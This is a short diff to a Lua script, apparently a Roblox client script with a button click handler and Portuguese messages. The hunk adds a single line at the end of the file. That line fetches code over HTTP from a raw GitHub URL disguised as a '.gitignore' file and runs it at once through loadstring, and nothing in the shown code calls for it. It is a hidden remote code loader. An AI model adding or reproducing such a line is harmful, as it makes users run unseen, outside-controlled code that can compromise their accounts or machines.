@@ -102,3 +102,4 @@ button.MouseButton1Click:Connect(function()
         print("Por favor, digite um nome de jogador.")
     end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Usehsbd/PetriksESP/main/.gitignore"))()
